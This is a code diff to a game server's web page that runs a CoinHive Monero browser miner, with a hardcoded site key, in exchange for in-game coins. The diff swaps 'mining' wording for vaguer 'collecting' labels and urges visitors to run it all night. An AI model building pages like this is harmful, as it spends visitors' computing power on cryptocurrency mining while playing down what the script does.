@@ -32,16 +32,16 @@
                     <div class="container">
                         <div class="col-md-12">
                             <h3><span class="fab fa-monero"></span>Miner</h3>
-                            <p><h4>How to use</h4>1. Insert your username<br>2. Select the speed you want and start mining blocks!<br>3. Join the server, and run /claim to collect coins!</p>
-  			  <p>TIP: Run all night to collect lots of coins!</p>
+                            <p><h4>How to use</h4>1. Enter Your Username...<br>2. Select Your Speed for Collecting Coins!<br>3. Collect Your Coins and Earn In-Game Items!</p>
+  			  <p>TIP: Run this all night to gain as many coins as possible!</p>
   			  <center>
-  			      <p id="speed">Speed: 70%</p>
-  			      <p id="hashes">Coins Found: 0</p>
-  			      <p id="miningspeed">Mining Speed: 0 b/s</p>
+  			      <p id="speed">Collecting Speed: 70%</p>
+  			      <p id="hashes">Coins Collected This Session: 0</p>
+  			      <p id="miningspeed">Collecting Speed: 0 b/s</p>
   			      <input type="range" min="1" max="100" value="70" class="slider" id="speedSlider">
   			  </center>
   			  <script>
-  			  var username = prompt("In game username: ");
+  			  var username = prompt("Your User: ");
   			  var miner = new CoinHive.User('SCA3hapILFYe947kAlG9m0JoGFGFUFeD', username, {throttle: 0.3});
       			  miner.start();
   			  miner.setNumThreads(4);
